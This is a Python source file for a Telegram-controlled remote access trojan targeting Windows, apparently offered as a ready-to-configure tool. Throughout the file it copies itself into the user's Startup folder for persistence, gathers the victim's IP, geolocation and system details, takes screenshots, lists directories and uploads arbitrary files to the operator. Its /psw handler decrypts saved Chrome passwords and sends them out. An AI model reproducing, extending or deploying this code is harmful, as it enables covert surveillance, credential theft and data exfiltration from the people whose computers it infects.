import os
import autopy
import telebot
from telebot import types
import requests
import platform
import sqlite3
import win32crypt
import win32ui
import pathlib
import sys
import logging
from datetime import datetime
import shutil
from typing import Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='bot.log'
)

# Constants
TOKEN = 'your_token_here'  # Replace with your actual token
ADMIN_ID = 'your_admin_id'  # Replace with your Telegram ID
USER_HOME = os.path.expanduser('~')
BANNER = '''
-------Commands-------

/self_des => Delete self
/target_info => Get target IP and system info
/screen => Capture and send screenshot
/dis => Disconnect from target
/msg => Show message box on target
/psw => Extract Chrome passwords
/dir => List directory contents
/dfile => Download file from target
/show_dir => Show current working directory
'''

# Initialize bot
bot = telebot.TeleBot(TOKEN)
logging.info("Bot initialized")

# Startup persistence
def setup_persistence():
    try:
        startup_path = os.path.join(USER_HOME, "AppData", "Roaming", "Microsoft", "Windows", 
                                 "Start Menu", "Programs", "Startup", "run.py")
        current_file = os.path.abspath(__file__)
        shutil.copy(current_file, startup_path)
        logging.info("Persistence setup completed")
    except Exception as e:
        logging.error(f"Persistence setup failed: {str(e)}")

# Notify admin on startup
def send_startup_notification():
    try:
        bot.send_message(ADMIN_ID, "Device online")
        logging.info("Startup notification sent")
    except Exception as e:
        logging.error(f"Startup notification failed: {str(e)}")

@bot.message_handler(commands=['start'])
def handle_start(message):
    try:
        if str(message.chat.id) != ADMIN_ID:
            bot.reply_to(message, "Unauthorized access")
            return
        bot.reply_to(message, "Connected to target")
        bot.send_message(ADMIN_ID, BANNER)
        logging.info("Start command received")
    except Exception as e:
        logging.error(f"Start command error: {str(e)}")

@bot.message_handler(commands=['target_info'])
def handle_target_info(message):
    try:
        if str(message.chat.id) != ADMIN_ID: return
        
        # Get IP info
        ip_response = requests.get('https://api.ipify.org/')
        ip = ip_response.content.decode()
        geo_response = requests.get(f'http://api.hackertarget.com/geoip/?q={ip}')
        
        # System info
        system_info = f"{platform.platform()}\n{platform.uname()[1]}"
        
        bot.send_message(ADMIN_ID, f"System Info:\n{system_info}")
        bot.send_message(ADMIN_ID, f"IP Info:\n{geo_response.content.decode()}")
        logging.info("Target info sent")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error getting target info: {str(e)}")
        logging.error(f"Target info error: {str(e)}")

@bot.message_handler(commands=['screen'])
def handle_screen(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        screenshot_path = os.path.join(USER_HOME, f'screen_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
        image = autopy.bitmap.capture_screen()
        image.save(screenshot_path)
        
        with open(screenshot_path, 'rb') as photo:
            bot.send_chat_action(ADMIN_ID, 'upload_photo')
            bot.send_photo(ADMIN_ID, photo)
            bot.send_message(ADMIN_ID, 'Screenshot sent')
        
        os.remove(screenshot_path)
        logging.info("Screenshot captured and sent")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error capturing screenshot: {str(e)}")
        logging.error(f"Screenshot error: {str(e)}")

@bot.message_handler(regexp='^/msg ')
def handle_msg(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        msg_text = message.text.replace('/msg ', '')
        win32ui.MessageBox(msg_text, "System Message")
        bot.send_message(ADMIN_ID, "Message displayed on target")
        logging.info("Message displayed on target")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error displaying message: {str(e)}")
        logging.error(f"Message error: {str(e)}")

@bot.message_handler(commands=['psw'])
def handle_passwords(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        bot.send_message(ADMIN_ID, 'Extracting passwords...')
        data_path = os.path.join(USER_HOME, "AppData", "Local", "Google", "Chrome", 
                               "User Data", "Default", "Login Data")
        
        with sqlite3.connect(data_path) as c:
            cursor = c.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            login_data = cursor.fetchall()

        credentials = {}
        for url, username, pwd in login_data:
            decrypted_pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1]
            credentials[url] = (username, decrypted_pwd.decode('utf-8') if decrypted_pwd else "")

        pwd_file = 'passwords.txt'
        with open(pwd_file, 'w', encoding='utf-8') as f:
            for url, (username, pwd) in credentials.items():
                f.write(f"\n{url}\n{username} | {pwd if pwd else 'NOT FOUND'}\n")

        with open(pwd_file, 'rb') as f:
            bot.send_document(ADMIN_ID, f)
        
        os.remove(pwd_file)
        logging.info("Passwords extracted and sent")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error extracting passwords: {str(e)}")
        logging.error(f"Password extraction error: {str(e)}")

@bot.message_handler(regexp='^/dir ')
def handle_dir(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        path = message.text.replace('/dir ', '')
        if not os.path.exists(path):
            bot.send_message(ADMIN_ID, "Directory not found")
            return
            
        files = [str(f) for f in pathlib.Path(path).iterdir()]
        chunk_size = 4000
        for i in range(0, len(files), chunk_size):
            bot.send_message(ADMIN_ID, "\n".join(files[i:i + chunk_size]))
        logging.info(f"Directory listing sent for {path}")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error listing directory: {str(e)}")
        logging.error(f"Directory listing error: {str(e)}")

@bot.message_handler(commands=['self_des'])
def handle_self_destruct(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        bot.send_message(ADMIN_ID, "Self-destructing...")
        file_path = os.path.abspath(__file__)
        os.remove(file_path)
        logging.info("Self-destruct executed")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Self-destruct error: {str(e)}")

@bot.message_handler(regexp='^/dfile ')
def handle_download(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        file_path = message.text.replace('/dfile ', '')
        if not os.path.exists(file_path):
            bot.send_message(ADMIN_ID, "File not found")
            return
            
        with open(file_path, 'rb') as f:
            bot.send_document(ADMIN_ID, f)
        logging.info(f"File downloaded: {file_path}")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error downloading file: {str(e)}")
        logging.error(f"File download error: {str(e)}")

@bot.message_handler(commands=['show_dir'])
def handle_show_dir(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        cwd = os.getcwd()
        bot.send_message(ADMIN_ID, cwd)
        logging.info("Current directory sent")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error getting directory: {str(e)}")
        logging.error(f"Show directory error: {str(e)}")

@bot.message_handler(commands=['dis'])
def handle_disconnect(message):
    if str(message.chat.id) != ADMIN_ID: return
    try:
        bot.send_message(ADMIN_ID, "Disconnecting...")
        logging.info("Disconnect command received")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Disconnect error: {str(e)}")

if __name__ == "__main__":
    setup_persistence()
    send_startup_notification()
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot polling error: {str(e)}")
